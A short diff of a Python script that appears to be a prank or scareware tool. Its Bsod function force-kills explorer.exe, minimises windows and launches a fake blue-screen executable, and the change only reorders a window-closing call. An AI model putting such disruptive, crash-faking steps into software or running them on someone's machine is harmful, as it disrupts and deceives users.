@@ -141,10 +141,10 @@ if ctypes.windll.shell32.IsUserAnAdmin():
             except: path = rndFile(folder=True)
                 
     def Bsod():
-        window.destroy()
         os.system("taskkill /f /im explorer.exe")
         pyautogui.hotkey("win", "d")
         os.startfile("BSoD.exe")
+        window.destroy()
         
     def Center(win):
         win.update_idletasks()
